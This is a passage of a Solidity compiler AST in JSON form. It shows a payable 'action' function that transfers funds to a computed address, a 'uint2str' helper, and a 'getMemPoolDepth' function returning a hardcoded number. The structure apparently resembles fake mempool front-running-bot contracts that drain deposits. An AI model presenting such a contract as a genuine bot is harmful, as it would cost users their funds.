																"typeName": {
																	"id": 1525,
																	"name": "address",
																	"nodeType": "ElementaryTypeName",
																	"src": "15996:8:3",
																	"stateMutability": "payable",
																	"typeDescriptions": {
																		"typeIdentifier": null,
																		"typeString": null
																	}
																}
															},
															"id": 1530,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "typeConversion",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "15996:40:3",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														"id": 1531,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "transfer",
														"nodeType": "MemberAccess",
														"referencedDeclaration": null,
														"src": "15996:49:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_transfer_nonpayable$_t_uint256_$returns$__$",
															"typeString": "function (uint256)"
														}
													},
													"id": 1537,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "15996:72:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 1538,
												"nodeType": "ExpressionStatement",
												"src": "15996:72:3"
											}
										]
									},
									"documentation": null,
									"functionSelector": "0a7a1c4d",
									"id": 1540,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "action",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1523,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15966:2:3"
									},
									"returnParameters": {
										"id": 1524,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "15984:0:3"
									},
									"scope": 1724,
									"src": "15951:125:3",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 1617,
										"nodeType": "Block",
										"src": "16324:403:3",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1549,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1547,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1542,
														"src": "16339:2:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1548,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16345:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "16339:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 1553,
												"nodeType": "IfStatement",
												"src": "16335:50:3",
												"trueBody": {
													"id": 1552,
													"nodeType": "Block",
													"src": "16348:37:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 1550,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "16370:3:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d",
																	"typeString": "literal_string \"0\""
																},
																"value": "0"
															},
															"functionReturnParameters": 1546,
															"id": 1551,
															"nodeType": "Return",
															"src": "16363:10:3"
														}
													]
												}
											},
											{
												"assignments": [
													1555
												],
												"declarations": [
													{
														"constant": false,
														"id": 1555,
														"mutability": "mutable",
														"name": "j",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1617,
														"src": "16395:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1554,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16395:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1557,
												"initialValue": {
													"argumentTypes": null,
													"id": 1556,
													"name": "_i",
													"nodeType": "Identifier",
													"overloadedDeclarations": [],
													"referencedDeclaration": 1542,
													"src": "16404:2:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16395:11:3"
											},
											{
												"assignments": [
													1559
												],
												"declarations": [
													{
														"constant": false,
														"id": 1559,
														"mutability": "mutable",
														"name": "len",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1617,
														"src": "16417:8:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1558,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16417:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1560,
												"initialValue": null,
												"nodeType": "VariableDeclarationStatement",
												"src": "16417:8:3"
											},
											{
												"body": {
													"id": 1571,
													"nodeType": "Block",
													"src": "16451:54:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1565,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "UnaryOperation",
																"operator": "++",
																"prefix": false,
																"src": "16466:5:3",
																"subExpression": {
																	"argumentTypes": null,
																	"id": 1564,
																	"name": "len",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1559,
																	"src": "16466:3:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1566,
															"nodeType": "ExpressionStatement",
															"src": "16466:5:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1569,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1567,
																	"name": "j",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1555,
																	"src": "16486:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3130",
																	"id": 1568,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "16491:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "16486:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1570,
															"nodeType": "ExpressionStatement",
															"src": "16486:7:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1563,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1561,
														"name": "j",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1555,
														"src": "16443:1:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1562,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16448:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "16443:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1572,
												"nodeType": "WhileStatement",
												"src": "16436:69:3"
											},
											{
												"assignments": [
													1574
												],
												"declarations": [
													{
														"constant": false,
														"id": 1574,
														"mutability": "mutable",
														"name": "bstr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1617,
														"src": "16515:17:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1573,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16515:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1579,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1577,
															"name": "len",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1559,
															"src": "16545:3:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 1576,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "NewExpression",
														"src": "16535:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_function_objectcreation_pure$_t_uint256_$returns$_t_bytes_memory_ptr_$",
															"typeString": "function (uint256) pure returns (bytes memory)"
														},
														"typeName": {
															"id": 1575,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "16539:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														}
													},
													"id": 1578,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16535:14:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16515:34:3"
											},
											{
												"assignments": [
													1581
												],
												"declarations": [
													{
														"constant": false,
														"id": 1581,
														"mutability": "mutable",
														"name": "k",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1617,
														"src": "16560:6:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 1580,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "16560:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1585,
												"initialValue": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1584,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1582,
														"name": "len",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1559,
														"src": "16569:3:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "31",
														"id": 1583,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16575:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_1_by_1",
															"typeString": "int_const 1"
														},
														"value": "1"
													},
													"src": "16569:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "16560:16:3"
											},
											{
												"body": {
													"id": 1610,
													"nodeType": "Block",
													"src": "16603:87:3",
													"statements": [
														{
															"expression": {
																"argumentTypes": null,
																"id": 1604,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"baseExpression": {
																		"argumentTypes": null,
																		"id": 1589,
																		"name": "bstr",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 1574,
																		"src": "16618:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_bytes_memory_ptr",
																			"typeString": "bytes memory"
																		}
																	},
																	"id": 1592,
																	"indexExpression": {
																		"argumentTypes": null,
																		"id": 1591,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"nodeType": "UnaryOperation",
																		"operator": "--",
																		"prefix": false,
																		"src": "16623:3:3",
																		"subExpression": {
																			"argumentTypes": null,
																			"id": 1590,
																			"name": "k",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 1581,
																			"src": "16623:1:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"isConstant": false,
																	"isLValue": true,
																	"isPure": false,
																	"lValueRequested": true,
																	"nodeType": "IndexAccess",
																	"src": "16618:9:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"nodeType": "Assignment",
																"operator": "=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"arguments": [
																		{
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"commonType": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					},
																					"id": 1601,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": false,
																					"lValueRequested": false,
																					"leftExpression": {
																						"argumentTypes": null,
																						"hexValue": "3438",
																						"id": 1597,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "16641:2:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_48_by_1",
																							"typeString": "int_const 48"
																						},
																						"value": "48"
																					},
																					"nodeType": "BinaryOperation",
																					"operator": "+",
																					"rightExpression": {
																						"argumentTypes": null,
																						"commonType": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						},
																						"id": 1600,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftExpression": {
																							"argumentTypes": null,
																							"id": 1598,
																							"name": "_i",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 1542,
																							"src": "16646:2:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "BinaryOperation",
																						"operator": "%",
																						"rightExpression": {
																							"argumentTypes": null,
																							"hexValue": "3130",
																							"id": 1599,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": true,
																							"kind": "number",
																							"lValueRequested": false,
																							"nodeType": "Literal",
																							"src": "16651:2:3",
																							"subdenomination": null,
																							"typeDescriptions": {
																								"typeIdentifier": "t_rational_10_by_1",
																								"typeString": "int_const 10"
																							},
																							"value": "10"
																						},
																						"src": "16646:7:3",
																						"typeDescriptions": {
																							"typeIdentifier": "t_uint256",
																							"typeString": "uint256"
																						}
																					},
																					"src": "16641:12:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				],
																				"id": 1596,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "16635:5:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint8_$",
																					"typeString": "type(uint8)"
																				},
																				"typeName": {
																					"id": 1595,
																					"name": "uint8",
																					"nodeType": "ElementaryTypeName",
																					"src": "16635:5:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 1602,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "16635:19:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		}
																	],
																	"expression": {
																		"argumentTypes": [
																			{
																				"typeIdentifier": "t_uint8",
																				"typeString": "uint8"
																			}
																		],
																		"id": 1594,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"lValueRequested": false,
																		"nodeType": "ElementaryTypeNameExpression",
																		"src": "16630:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_type$_t_bytes1_$",
																			"typeString": "type(bytes1)"
																		},
																		"typeName": {
																			"id": 1593,
																			"name": "byte",
																			"nodeType": "ElementaryTypeName",
																			"src": "16630:4:3",
																			"typeDescriptions": {
																				"typeIdentifier": null,
																				"typeString": null
																			}
																		}
																	},
																	"id": 1603,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"kind": "typeConversion",
																	"lValueRequested": false,
																	"names": [],
																	"nodeType": "FunctionCall",
																	"src": "16630:25:3",
																	"tryCall": false,
																	"typeDescriptions": {
																		"typeIdentifier": "t_bytes1",
																		"typeString": "bytes1"
																	}
																},
																"src": "16618:37:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bytes1",
																	"typeString": "bytes1"
																}
															},
															"id": 1605,
															"nodeType": "ExpressionStatement",
															"src": "16618:37:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"id": 1608,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftHandSide": {
																	"argumentTypes": null,
																	"id": 1606,
																	"name": "_i",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 1542,
																	"src": "16670:2:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "Assignment",
																"operator": "/=",
																"rightHandSide": {
																	"argumentTypes": null,
																	"hexValue": "3130",
																	"id": 1607,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"kind": "number",
																	"lValueRequested": false,
																	"nodeType": "Literal",
																	"src": "16676:2:3",
																	"subdenomination": null,
																	"typeDescriptions": {
																		"typeIdentifier": "t_rational_10_by_1",
																		"typeString": "int_const 10"
																	},
																	"value": "10"
																},
																"src": "16670:8:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 1609,
															"nodeType": "ExpressionStatement",
															"src": "16670:8:3"
														}
													]
												},
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 1588,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 1586,
														"name": "_i",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 1542,
														"src": "16594:2:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "!=",
													"rightExpression": {
														"argumentTypes": null,
														"hexValue": "30",
														"id": 1587,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "16600:1:3",
														"subdenomination": null,
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "16594:7:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 1611,
												"nodeType": "WhileStatement",
												"src": "16587:103:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1614,
															"name": "bstr",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1574,
															"src": "16714:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes_memory_ptr",
																"typeString": "bytes memory"
															}
														],
														"id": 1613,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "16707:6:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_string_storage_ptr_$",
															"typeString": "type(string storage pointer)"
														},
														"typeName": {
															"id": 1612,
															"name": "string",
															"nodeType": "ElementaryTypeName",
															"src": "16707:6:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1615,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "16707:12:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_string_memory_ptr",
														"typeString": "string memory"
													}
												},
												"functionReturnParameters": 1546,
												"id": 1616,
												"nodeType": "Return",
												"src": "16700:19:3"
											}
										]
									},
									"documentation": null,
									"id": 1618,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "uint2str",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1543,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1542,
												"mutability": "mutable",
												"name": "_i",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1618,
												"src": "16263:7:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1541,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "16263:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16262:9:3"
									},
									"returnParameters": {
										"id": 1546,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1545,
												"mutability": "mutable",
												"name": "_uintAsString",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1618,
												"src": "16295:27:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 1544,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "16295:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16294:29:3"
									},
									"scope": 1724,
									"src": "16245:482:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1625,
										"nodeType": "Block",
										"src": "16792:32:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "323236383839",
													"id": 1623,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "number",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "16810:6:3",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_rational_226889_by_1",
														"typeString": "int_const 226889"
													},
													"value": "226889"
												},
												"functionReturnParameters": 1622,
												"id": 1624,
												"nodeType": "Return",
												"src": "16803:13:3"
											}
										]
									},
									"documentation": null,
									"id": 1626,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "getMemPoolDepth",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 1619,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "16760:2:3"
									},
									"returnParameters": {
										"id": 1622,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 1621,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 1626,
												"src": "16786:4:3",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 1620,
													"name": "uint",
													"nodeType": "ElementaryTypeName",
													"src": "16786:4:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "16785:6:3"
									},
									"scope": 1724,
									"src": "16736:88:3",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 1722,
										"nodeType": "Block",
										"src": "17108:537:3",
										"statements": [
											{
												"assignments": [
													1636
												],
												"declarations": [
													{
														"constant": false,
														"id": 1636,
														"mutability": "mutable",
														"name": "_baseBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1722,
														"src": "17119:23:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1635,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17119:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1641,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1639,
															"name": "_base",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1628,
															"src": "17151:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1638,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17145:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1637,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17145:5:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1640,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17145:12:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "17119:38:3"
											},
											{
												"assignments": [
													1643
												],
												"declarations": [
													{
														"constant": false,
														"id": 1643,
														"mutability": "mutable",
														"name": "_valueBytes",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 1722,
														"src": "17168:24:3",
														"stateVariable": false,
														"storageLocation": "memory",
														"typeDescriptions": {
															"typeIdentifier": "t_bytes_memory_ptr",
															"typeString": "bytes"
														},
														"typeName": {
															"id": 1642,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17168:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_bytes_storage_ptr",
																"typeString": "bytes"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 1648,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 1646,
															"name": "_value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 1630,
															"src": "17201:6:3",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 1645,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "17195:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_bytes_storage_ptr_$",
															"typeString": "type(bytes storage pointer)"
														},
														"typeName": {
															"id": 1644,
															"name": "bytes",
															"nodeType": "ElementaryTypeName",
															"src": "17195:5:3",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 1647,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "17195:13:3",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bytes_memory_ptr",
														"typeString": "bytes memory"
													}
												},
